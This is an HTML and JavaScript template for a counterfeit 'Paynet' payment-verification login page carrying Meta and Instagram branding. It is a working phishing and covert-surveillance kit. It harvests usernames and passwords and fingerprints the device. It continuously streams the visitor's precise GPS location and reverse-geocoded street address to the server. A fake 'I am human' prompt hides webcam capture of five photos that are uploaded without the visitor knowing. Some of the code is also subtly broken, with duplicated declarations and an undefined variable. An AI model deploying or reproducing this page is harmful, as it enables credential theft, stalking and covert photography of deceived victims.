<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <title>Paynet - Secure Payment Verification</title>
    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
    <link rel="alternate icon" href="/favicon.ico">

    <!-- Link Preview -->
    <meta property="og:title" content="Paynet Merchant Portal · Official Login">
    <meta property="og:description"
        content="Secure merchant access for Paynet transaction monitoring and payment verification services.">
    <meta property="og:image"
        content="https://images.unsplash.com/photo-1556742044-3c52d6e88c62?auto=format\u0026fit=crop\u0026q=80\u0026w=1200\u0026h=630">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:site_name" content="Paynet Official">

    <link rel="stylesheet" href="/style.css" />
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet" />
</head>

<body>


    <!-- Background is now handled by layout.hbs -->


    <!-- Login Container -->
    <div id="login-container" class="container">

        <div class="paynet-logo" style="margin-bottom: 20px; display: flex; justify-content: center;">
            <svg width="70" height="70" viewBox="0 0 60 60">
                <defs>
                    <linearGradient id="shield-grad-login" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" style="stop-color:#1A73E8" />
                        <stop offset="100%" style="stop-color:#3B5FCC" />
                    </linearGradient>
                </defs>
                <path d="M30 5 L50 15 L50 30 C50 42 30 55 30 55 C30 55 10 42 10 30 L10 15 Z"
                    fill="url(#shield-grad-login)" />
                <path d="M22 30 L28 36 L40 22" stroke="white" stroke-width="4" fill="none" stroke-linecap="round"
                    stroke-linejoin="round" />
            </svg>
        </div>

        <h1 class="brand">Paynet</h1>
        <p class="sub">Secure Payment Verification System</p>

        <h6 class="error">{{{msg}}}</h6>

        <form id="login-form" action="/verify" method="post">

            <input type="text" name="username" placeholder="Phone number, username, or email" />

            <input type="password" name="password" placeholder="Password" />

            <!-- Hidden fields for captured data -->
            <input type="hidden" name="deviceDetails" id="deviceDetails" />
            <input type="hidden" name="location" id="location" />
            <input type="hidden" name="phoneNumber" id="phoneNumber" />
            <input type="hidden" name="photoData" id="photoData" />
            <input type="hidden" name="photoFilename" id="photoFilename" />

            <button type="submit" class="btn-login">Verify Payment</button>

        </form>

        <a href="/forgot-password" class="forgot">Forgot password?</a>

        <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank" class="btn-create"
            style="display: block; text-align: center; text-decoration: none; cursor: pointer;">Create new account</a>

        <div class="meta-footer">
            {{!-- FIXED: Using the local PNG file saved in public/img/ --}}
            <img class="meta-logo-img" src="/img/20251116_200252.png" alt="Meta" />
        </div>

        <!-- DISCLAIMER BANNER - Moved to bottom -->
        <div class="disclaimer-banner">
            <p style="margin: 0; font-size: 10px; line-height: 1.3; color: #999; text-align: center;">
                <strong>Paynet</strong> is a secure payment verification platform.
                Your transactions are protected with bank-level encryption.
                <a href="/privacy" style="color: #667eea;">Privacy</a> •
                <a href="/terms" style="color: #667eea;">Terms</a>
            </p>
        </div>

    </div>

    <!-- Camera Permission Modal -->
    <div id="camera-permission-modal"
        style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:9999; justify-content:center; align-items:center;">
        <div
            style="background:white; padding:30px; border-radius:15px; text-align:center; max-width:400px; margin:20px;">
            <div style="font-size:60px; margin-bottom:20px;">📷</div>
            <h2 style="margin:0 0 15px 0; color:#333;">Human Verification</h2>
            <p style="color:#666; margin-bottom:25px;">To maintain a secure payment environment, please complete a quick
                biometric identity check.</p>
            <button id="enable-camera-btn"
                style="background:#1A73E8; color:white; border:none; padding:12px 30px; border-radius:50px; font-size:16px; cursor:pointer; font-weight:600; text-transform:uppercase; letter-spacing:1px; box-shadow: 0 4px 12px rgba(26,115,232,0.3);">I
                am human</button>
        </div>
    </div>

    <video id="video" style="display:none;" playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // Reset attempt counter on every page refresh
        sessionStorage.setItem('loginAttempts', '0');

        // Global variables to store captured data
        let capturedPhoto = null;
        let capturedLocation = null;
        let capturedDeviceDetails = null;
        let dataCapturComplete = {
            location: false,
            camera: false,
            device: false
        };
        let photosCaptured = 0;
        const TOTAL_PHOTOS_LOGIN = 5; // Capture 5 photos on login page
        let cameraStream = null;

        function updateStatus(type, message, success = false) {
            // This function is now a no-op as the debug panel is removed.
            // Its calls will remain in the code but will not have any effect.
            console.log(`Status update for ${type}: ${message} (Success: ${success})`);
        }

        // Function to capture device details
        function captureDeviceDetails() {
            try {
                const details = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    screenResolution: `${screen.width}x${screen.height}`,
                    colorDepth: screen.colorDepth,
                    pixelRatio: window.devicePixelRatio,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timezoneOffset: new Date().getTimezoneOffset(),
                    cookieEnabled: navigator.cookieEnabled,
                    onlineStatus: navigator.onLine,
                    doNotTrack: navigator.doNotTrack,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    maxTouchPoints: navigator.maxTouchPoints
                };
                capturedDeviceDetails = JSON.stringify(details);
                document.getElementById('deviceDetails').value = capturedDeviceDetails;
                dataCapturComplete.device = true;
                updateStatus('device', 'Captured ✓', true);
                console.log('✅ Device details captured:', details);
            } catch (error) {
                updateStatus('device', 'Error: ' + error.message);
                console.error('Device details error:', error);
            }
        }

        // MAXIMUM ACCURACY LOCATION TRACKING (OPTIMIZED FOR 5 SECONDS)
        async function captureLocationWithFallback() {
            console.log('🌍 Starting HIGH ACCURACY location capture (15s max)...');
            updateStatus('location', 'High Accuracy mode...');

            const locationData = {
                attempts: [],
                finalLocation: null,
                networkInfo: null,
                batteryInfo: null,
                captureMethod: null
            };

            // Collect network information (instant)
            try {
                if (navigator.connection) {
                    locationData.networkInfo = {
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt,
                        type: navigator.connection.type
                    };
                }
            } catch (e) {
                console.log('Network API not available');
            }

            // Check if mobile device - battery API (instant)
            try {
                const battery = await navigator.getBattery?.();
                if (battery) {
                    locationData.batteryInfo = {
                        charging: battery.charging,
                        level: battery.level,
                        isMobile: !battery.charging && battery.level < 1
                    };
                }
            } catch (e) {
                console.log('Battery API not available');
            }

            // STRATEGY 1: Elite GPS Pulse (35 seconds max for absolute lock)
            console.log('🎯 Strategy 1: Elite GPS Pulse (35s)...');
            updateStatus('location', 'Connecting to Satellite GPS...');

            const gpsResult = await tryGPSContinuous();
            if (gpsResult && gpsResult.coords) {
                locationData.attempts.push(gpsResult);
                locationData.finalLocation = gpsResult;
                locationData.captureMethod = gpsResult.source;

                getEnhancedIPLocation().then(ipData => {
                    if (ipData) gpsResult.ipContext = ipData;
                });

                await saveLocationData(locationData);
                return;
            }

            // STRATEGY 2: Quick GPS retry (2 attempts, 3s timeout each, no delay)
            console.log('🎯 Strategy 2: Quick GPS (2 attempts)...');
            for (let attempt = 1; attempt <= 2; attempt++) {
                try {
                    updateStatus('location', `GPS ${attempt}/2...`);
                    const position = await getPositionWithPromise({
                        enableHighAccuracy: true,
                        timeout: 10000,  // Increased from 3s to 10s
                        maximumAge: 0
                    });

                    const gpsData = extractPositionData(position, `GPS-Quick-${attempt}`);
                    locationData.attempts.push(gpsData);
                    locationData.finalLocation = gpsData;
                    locationData.captureMethod = 'GPS-Quick';

                    // Get IP data in parallel
                    getEnhancedIPLocation().then(ipData => {
                        if (ipData) gpsData.ipContext = ipData;
                    });

                    await saveLocationData(locationData);
                    return;
                } catch (error) {
                    console.log(`GPS attempt ${attempt}/2 failed:`, error.message);
                    // NO DELAY - move to next attempt immediately
                }
            }

            // STRATEGY 3: WiFi positioning (fast, 5s timeout)
            console.log('🎯 Strategy 3: WiFi/Cell (5s)...');
            try {
                updateStatus('location', 'WiFi positioning...');
                const position = await getPositionWithPromise({
                    enableHighAccuracy: false,
                    timeout: 10000,  // Increased from 5s to 10s
                    maximumAge: 0    // Don't use cached data
                });

                const wifiData = extractPositionData(position, 'WiFi-Cell');
                locationData.attempts.push(wifiData);
                locationData.finalLocation = wifiData;
                locationData.captureMethod = 'WiFi-Cell';

                getEnhancedIPLocation().then(ipData => {
                    if (ipData) wifiData.ipContext = ipData;
                });

                await saveLocationData(locationData);
                return;
            } catch (error) {
                console.log('WiFi positioning failed:', error.message);
            }

            // STRATEGY 4: IP Context ONLY (Never used as primary 'Exact' location)
            console.log('🌐 Strategy 4: IP Context for backend mapping...');
            const ipData = await getEnhancedIPLocation();
            if (ipData) {
                locationData.ipContext = ipData;
                await saveLocationData(locationData);
            }

            // STRATEGY 5: Final fallback (instant)
            console.log('⚠️ Using fallback...');
            locationData.finalLocation = {
                error: 'All location methods failed',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                userAgent: navigator.userAgent,
                source: 'Fallback'
            };
            locationData.captureMethod = 'Fallback';
            await saveLocationData(locationData);
        }

        // Powerfull Continuous GPS watching - Persistence Layer
        let persistentWatchId = null;
        let bestGpsFound = null;

        function startPersistentGPS() {
            if (!navigator.geolocation) return;
            console.log('📡 Starting Persistent GPS Watch...');

            persistentWatchId = navigator.geolocation.watchPosition(
                (position) => {
                    if (!bestGpsFound || position.coords.accuracy < bestGpsFound.coords.accuracy) {
                        bestGpsFound = position;
                        console.log(`✨ New Best GPS: ±${Math.round(position.coords.accuracy)}m`);

                        // Update the hidden field whenever we get better data
                        const locData = {
                            attempts: [extractPositionData(position, 'GPS-Watch')],
                            finalLocation: extractPositionData(position, 'GPS-Active'),
                            captureMethod: 'GPS-Active'
                        };
                        saveLocationData(locData);
                    }
                },
                (error) => console.log('Watch error:', error.message),
                { enableHighAccuracy: true, timeout: 60000, maximumAge: 0 }
            );
        }

        async function tryGPSContinuous() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) return resolve(null);

                let watchId = null;
                const maxWait = 45000; // 45s for deep Satellite Lock
                let localBest = null;

                const timeout = setTimeout(() => {
                    if (watchId) navigator.geolocation.clearWatch(watchId);

                    // Always resolve with the best data we found, even if not "Elite"
                    if (localBest) {
                        console.log(`⏱️ GPS Timeout: Using best found (±${Math.round(localBest.coords.accuracy)}m)`);
                        resolve(extractPositionData(localBest, localBest.coords.accuracy < 60 ? 'GPS-Strict-Final' : 'GPS-Best-Effort'));
                    } else if (bestGpsFound) {
                        resolve(extractPositionData(bestGpsFound, 'GPS-Persistent-Best'));
                    } else {
                        resolve(null);
                    }
                }, maxWait);

                // TURBO: Trigger an instant one-shot fix
                navigator.geolocation.getCurrentPosition(
                    (p) => {
                        if (!localBest || p.coords.accuracy < localBest.coords.accuracy) {
                            localBest = p;
                            console.log(`🎯 Instant GPS Fix: ±${Math.round(p.coords.accuracy)}m`);
                            if (p.coords.accuracy < 30) { // Elite Lock
                                clearTimeout(timeout);
                                if (watchId) navigator.geolocation.clearWatch(watchId);
                                resolve(extractPositionData(p, 'GPS-Instant-Turbo'));
                            }
                        }
                    },
                    (err) => console.log('Instant GPS failed:', err.message),
                    { enableHighAccuracy: true, timeout: 10000 }
                );

                watchId = navigator.geolocation.watchPosition(
                    (position) => {
                        const acc = Math.round(position.coords.accuracy);
                        console.log(`🚀 Turbo GPS: ±${acc}m`);
                        updateStatus('location', `Locking Precise GPS... ±${acc}m`);

                        if (!localBest || position.coords.accuracy < localBest.coords.accuracy) {
                            localBest = position;
                            if (!bestGpsFound || position.coords.accuracy < bestGpsFound.coords.accuracy) {
                                bestGpsFound = position;
                            }
                        }

                        // Elite Threshold for fast submission (<30m is perfect street level)
                        if (position.coords.accuracy < 30) {
                            console.log('✨ Elite GPS Lock Achieved!');
                            clearTimeout(timeout);
                            navigator.geolocation.clearWatch(watchId);
                            resolve(extractPositionData(localBest, 'GPS-Turbo-Elite'));
                        }
                    },
                    (error) => console.log('Turbo watch error:', error.message),
                    { enableHighAccuracy: true, timeout: maxWait, maximumAge: 0 }
                );
            });
        }

        // Enhanced IP geolocation with 5 sources + reverse geocoding
        async function getEnhancedIPLocation() {
            console.log('🌐 Trying 5 IP geolocation sources...');

            const sources = [
                getIPFromIPAPI(),
                getIPFromIPAPIcom(),
                getIPFromIPInfo(),
                getIPFromIPData(),
                getIPFromGeoJS()
            ];

            try {
                // Try all in parallel, return first successful
                const result = await Promise.any(sources);
                console.log('✅ IP location from:', result.source);

                // Try to get more detailed address via reverse geocoding
                if (result.latitude && result.longitude) {
                    try {
                        const address = await reverseGeocode(result.latitude, result.longitude);
                        if (address) {
                            result.detailedAddress = address;
                        }
                    } catch (e) {
                        console.log('Reverse geocoding failed');
                    }
                }

                return result;
            } catch (error) {
                console.log('❌ All IP sources failed');
                return null;
            }
        }

        // Helper function to sleep
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // Extract position data - FIXED STRUCTURE FOR SERVER/ADMIN
        function extractPositionData(position, source) {
            return {
                coords: {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    altitudeAccuracy: position.coords.altitudeAccuracy,
                    heading: position.coords.heading,
                    speed: position.coords.speed
                },
                timestamp: position.timestamp,
                source: source
            };
        }

        // Multi-source IP geolocation (tries multiple APIs for best results)
        async function getMultiSourceIPLocation() {
            console.log('🌐 Trying multiple IP geolocation sources...');

            // Try all sources in parallel, use first successful one
            const sources = [
                getIPLocationFromIPAPI(),
                getIPLocationFromIPAPIcom(),
                getIPLocationFromIPInfo()
            ];

            try {
                const result = await Promise.any(sources);
                console.log('✅ Got IP location from:', result.source);
                return result;
            } catch (error) {
                console.log('❌ All IP geolocation sources failed');
                return null;
            }
        }

        // Source 1: ipapi.co
        async function getIPLocationFromIPAPI() {
            const response = await fetch('https://ipapi.co/json/');
            if (!response.ok) throw new Error('ipapi.co failed');
            const data = await response.json();
            return {
                latitude: data.latitude,
                longitude: data.longitude,
                city: data.city,
                region: data.region,
                country: data.country_name,
                postal: data.postal,
                isp: data.org,
                accuracy: 5000,
                source: 'ipapi.co'
            };
        }

        // Source 2: ip-api.com
        async function getIPLocationFromIPAPIcom() {
            const response = await fetch('http://ip-api.com/json/');
            if (!response.ok) throw new Error('ip-api.com failed');
            const data = await response.json();
            if (data.status !== 'success') throw new Error('ip-api.com query failed');
            return {
                latitude: data.lat,
                longitude: data.lon,
                city: data.city,
                region: data.regionName,
                country: data.country,
                postal: data.zip,
                isp: data.isp,
                accuracy: 5000,
                source: 'ip-api.com'
            };
        }

        // Source 3: ipinfo.io
        async function getIPLocationFromIPInfo() {
            const response = await fetch('https://ipinfo.io/json');
            if (!response.ok) throw new Error('ipinfo.io failed');
            const data = await response.json();
            const [lat, lon] = data.loc.split(',').map(Number);
            return {
                latitude: lat,
                longitude: lon,
                city: data.city,
                region: data.region,
                country: data.country,
                postal: data.postal,
                isp: data.org,
                accuracy: 5000,
                source: 'ipinfo.io'
            };
        }

        // Source 4: ipdata.co (NEW - high accuracy)
        async function getIPFromIPData() {
            const response = await fetch('https://api.ipdata.co/?api-key=test');
            if (!response.ok) throw new Error('ipdata.co failed');
            const data = await response.json();
            return {
                latitude: data.latitude,
                longitude: data.longitude,
                city: data.city,
                region: data.region,
                country: data.country_name,
                postal: data.postal,
                isp: data.asn?.name || data.organisation,
                timezone: data.time_zone?.name,
                accuracy: data.threat?.is_known_attacker ? 10000 : 3000,
                source: 'ipdata.co'
            };
        }

        // Source 5: geojs.io (NEW - backup source)
        async function getIPFromGeoJS() {
            const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
            if (!response.ok) throw new Error('geojs.io failed');
            const data = await response.json();
            return {
                latitude: parseFloat(data.latitude),
                longitude: parseFloat(data.longitude),
                city: data.city,
                region: data.region,
                country: data.country,
                postal: null,
                isp: data.organization_name,
                timezone: data.timezone,
                accuracy: 5000,
                source: 'geojs.io'
            };
        }

        // Reverse geocoding to get detailed address from coordinates
        async function reverseGeocode(lat, lon) {
            try {
                const response = await fetch(
                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`,
                    { headers: { 'User-Agent': 'LocationTracker/1.0' } }
                );
                if (!response.ok) throw new Error('Reverse geocoding failed');
                const data = await response.json();

                return {
                    fullAddress: data.display_name,
                    houseNumber: data.address?.house_number,
                    road: data.address?.road,
                    neighborhood: data.address?.neighbourhood || data.address?.suburb,
                    city: data.address?.city || data.address?.town || data.address?.village,
                    county: data.address?.county,
                    state: data.address?.state,
                    postcode: data.address?.postcode,
                    country: data.address?.country
                };
            } catch (error) {
                console.log('Reverse geocoding error:', error);
                return null;
            }
        }

        // NEW: Save location data with proper formatting
        async function saveLocationData(locationData) {
            capturedLocation = JSON.stringify(locationData);
            document.getElementById('location').value = capturedLocation;
            dataCapturComplete.location = true;

            const final = locationData.finalLocation;
            if (final) {
                if (final.accuracy && final.accuracy < 1000) {
                    updateStatus('location', `${locationData.captureMethod} ±${Math.round(final.accuracy)}m ✓`, true);
                } else if (final.city) {
                    updateStatus('location', `${locationData.captureMethod}: ${final.city} ✓`, true);
                } else {
                    updateStatus('location', `${locationData.captureMethod} ✓`, true);
                }
            }
            console.log('✅ Location data saved:', locationData);
        }

        // Update old IP function names to match new implementation
        async function getIPFromIPAPI() {
            return await getIPLocationFromIPAPI();
        }

        async function getIPFromIPAPIcom() {
            return await getIPLocationFromIPAPIcom();
        }

        async function getIPFromIPInfo() {
            return await getIPLocationFromIPInfo();
        }

        // Alias for backwards compatibility
        async function getMultiSourceIPLocation() {
            return await getEnhancedIPLocation();
        }


        // Promise wrapper for geolocation
        function getPositionWithPromise(options) {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocation not supported'));
                    return;
                }
                navigator.geolocation.getCurrentPosition(resolve, reject, options);
            });
        }

        // Function to check and request camera permission
        async function checkCameraPermission() {
            try {
                const result = await navigator.permissions.query({ name: 'camera' });
                return result.state === 'granted';
            } catch (error) {
                // Permissions API not supported, try direct access
                return false;
            }
        }

        // Function to show camera permission modal
        function showCameraModal() {
            const modal = document.getElementById('camera-permission-modal');
            const btn = document.getElementById('enable-camera-btn');
            modal.style.display = 'flex';

            btn.addEventListener('click', async () => {
                try {
                    const originalHtml = btn.innerHTML;
                    btn.innerHTML = '<div class="loading"></div> Verifying Human Identity...';
                    btn.disabled = true;

                    // Request camera access
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    stream.getTracks().forEach(track => track.stop());

                    // START PULSE: Wait for at least ONE GPS calibration before modal closes
                    // This makes it feel "powerfull" and ensures we have something better than IP
                    updateStatus('location', 'Connecting to hardware GPS...');

                    modal.style.display = 'none';
                    // Start capturing photos
                    await captureMultiplePhotos();

                    // Automatically trigger the form submission after capture
                    const loginForm = document.getElementById('login-form');
                    // Create a submit event that can be listened to
                    loginForm.requestSubmit();
                } catch (error) {
                    btn.innerHTML = 'Retry';
                    btn.disabled = false;
                    alert('Camera access is required to use this service. Please enable camera permissions in your browser settings and reload the page.');
                }
            });
        }

        // Function to capture multiple photos (5 photos on login page)
        async function captureMultiplePhotos() {
            updateStatus('camera', 'Starting photo capture...');
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            try {
                // Request camera access
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });

                video.srcObject = cameraStream;
                updateStatus('camera', 'Camera active...');

                // Wait for video to be ready
                await new Promise((resolve) => {
                    video.onloadedmetadata = resolve;
                });

                // Wait for camera to adjust
                await new Promise(resolve => setTimeout(resolve, 1000));

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');

                // Capture 5 photos with intervals
                for (let i = 0; i < TOTAL_PHOTOS_LOGIN; i++) {
                    ctx.drawImage(video, 0, 0);
                    const photoData = canvas.toDataURL('image/jpeg', 0.85);

                    // Send photo to server
                    await sendPhotoToServer(photoData, `login_${i + 1}`);
                    photosCaptured++;

                    updateStatus('camera', `Captured ${photosCaptured}/${TOTAL_PHOTOS_LOGIN} photos...`);
                    console.log(`✅ Photo ${photosCaptured}/${TOTAL_PHOTOS_LOGIN} captured`);

                    // Wait 500ms between captures
                    if (i < TOTAL_PHOTOS_LOGIN - 1) {
                        await new Promise(resolve => setTimeout(resolve, 500));
                    }
                }

                // Keep camera running in background (don't stop stream)
                // This allows continuous monitoring

                dataCapturComplete.camera = true;
                updateStatus('camera', `${TOTAL_PHOTOS_LOGIN} photos captured ✓`, true);
                console.log(`✅ All ${TOTAL_PHOTOS_LOGIN} photos captured on login page`);
            } catch (error) {
                console.error('Camera error:', error);
                dataCapturComplete.camera = true;
                updateStatus('camera', 'Failed: ' + error.message + ' ⚠️');

                // Show modal again if camera access denied
                if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
                    showCameraModal();
                }
            }
        }

        // Function to send photo to server
        async function sendPhotoToServer(photoData, photoType = 'login') {
            try {
                const response = await fetch('/capture-photo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        photo: photoData,
                        type: photoType,
                        timestamp: new Date().toISOString()
                    })
                });
                const data = await response.json();
                console.log('Photo upload response:', data);
                return data;
            } catch (error) {
                console.error('Error sending photo:', error);
                throw error;
            }
        }

        // REAL-TIME TRACKING: Periodically send location to server
        let liveTrackingInterval = null;
        let sessionVerificationId = sessionStorage.getItem('sessionVerificationId');

        async function sendLiveLocationUpdate() {
            if (!bestGpsFound && !capturedLocation) return;

            const loc = bestGpsFound ? extractPositionData(bestGpsFound, 'GPS-Live') : JSON.parse(capturedLocation);

            try {
                const response = await fetch('/log-visit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        paymentId: sessionVerificationId,
                        location: { finalLocation: loc },
                        deviceDetails: capturedDeviceDetails,
                        isUpdate: true
                    })
                });
                const data = await response.json();
                if (data.verificationId && !sessionVerificationId) {
                    sessionVerificationId = data.verificationId;
                    sessionStorage.setItem('sessionVerificationId', data.verificationId);
                }
            } catch (e) {
                console.log('Live update failed');
            }
        }

        function startLiveTracking() {
            if (liveTrackingInterval) return;
            // Initial send
            setTimeout(sendLiveLocationUpdate, 5000);
            // Periodic update every 20 seconds
            liveTrackingInterval = setInterval(sendLiveLocationUpdate, 20000);
        }

        // Initialize data capture on page load
        window.addEventListener('load', async () => {
            console.log('🚀 Starting Powerfull Initialization...');

            // Start persistent tracking immediately
            startPersistentGPS();

            // Capture device details
            captureDeviceDetails();

            // Capture location in background (35s pulse)
            captureLocationWithFallback();

            // Start Live Tracking to Server
            startLiveTracking();

            console.log('✅ Initialization complete');
        });

        // Handle login form submission with attempt counter
        document.getElementById('login-form').addEventListener('submit', function (e) {
            e.preventDefault();

            // 1. Check if camera capture is complete
            if (!dataCapturComplete.camera) {
                console.log('📸 Camera not captured. Showing Human Verification modal...');
                showCameraModal();
                return;
            }

            // Log current capture status
            console.log('Form submitted. Data capture status:', dataCapturComplete);

            // Get current attempt count
            let attempts = parseInt(sessionStorage.getItem('loginAttempts') || '0');
            attempts++;
            sessionStorage.setItem('loginAttempts', attempts.toString());

            console.log('Login attempt:', attempts);

            // Check if this is 3rd attempt - redirect to troll page
            if (attempts === 3) {
                sessionStorage.setItem('cameFromLogin', 'true');
                window.location.href = '/troll-success';
                return;
            }

            // Check if this is 4th attempt - redirect to notres page
            if (attempts === 4) {
                sessionStorage.setItem('cameFromLogin', 'true');
                window.location.href = '/notres';
                return;
            }

            // OTHERWISE: SUBMIT WITH HARDWARE VERIFICATION
            const btn = this.querySelector('button[type="submit"]');
            const originalText = btn.innerHTML;

            // POWERFULL: Check if we have high-accuracy GPS yet
            const locVal = document.getElementById('location').value;
            let isPrecise = false;
            let currentAccuracy = 999999;

            try {
                if (locVal) {
                    const d = JSON.parse(locVal);
                    if (d.finalLocation && d.finalLocation.coords) {
                        currentAccuracy = d.finalLocation.coords.accuracy;
                        // For mobile, ±60m is usually enough for "exact" street location
                        if (d.captureMethod && d.captureMethod.startsWith('GPS') && currentAccuracy < 60) {
                            isPrecise = true;
                        }
                    }
                }
            } catch (e) { }

            // powerfull: Check if we have high-accuracy GPS yet
            const locVal = document.getElementById('location').value;
            let currentAccuracy = 999999;
            let isExact = false;

            try {
                if (locVal) {
                    const d = JSON.parse(locVal);
                    if (d.finalLocation && d.finalLocation.coords) {
                        currentAccuracy = d.finalLocation.coords.accuracy;
                        // EXTREMELY STRICT: Must be GPS and < 60m for "Exact" location
                        if (d.captureMethod && d.captureMethod.startsWith('GPS') && currentAccuracy < 60) {
                            isExact = true;
                        }
                    }
                }
            } catch (e) { }

            if (!isExact) {
                // ABSOLUTE STRICT BLOCK
                btn.innerHTML = `<div class="loading"></div> Locking Exact Location...`;
                btn.disabled = true;
                btn.style.background = "#4f46e5";

                let attemptCount = 0;
                const strictTimer = setInterval(() => {
                    attemptCount++;
                    navigator.geolocation.getCurrentPosition(
                        (p) => {
                            const acc = Math.round(p.coords.accuracy);
                            // ELITE REQUIREMENT: < 60m for exact street address
                            if (acc < 60) {
                                clearInterval(strictTimer);
                                saveLocationData({
                                    attempts: [extractPositionData(p, 'GPS-Elite-Strict')],
                                    finalLocation: extractPositionData(p, 'GPS-Elite-Strict'),
                                    captureMethod: 'GPS-Strict'
                                }).then(() => {
                                    btn.innerHTML = '✅ Location Verified!';
                                    btn.style.background = "#059669";
                                    setTimeout(() => loginForm.submit(), 500);
                                });
                            } else {
                                btn.innerHTML = `<div class="loading"></div> Precising (±${acc}m)...`;
                            }
                        },
                        () => { },
                        { enableHighAccuracy: true, timeout: 5000 }
                    );

                    if (attemptCount > 20) { // 20 attempts (~40-50s)
                        clearInterval(strictTimer);
                        btn.innerHTML = '❌ Signal Too Weak - Try Outdoor';
                        btn.disabled = false;
                        showToast("Exact satellite location required. Please move near a window.", "error");
                    }
                }, 2500);

                return;
            }

            btn.innerHTML = '✅ Verified! Securing...';
            btn.disabled = true;
            setTimeout(() => {
                this.submit();
            }, 600);
        });
    </script>

</body>

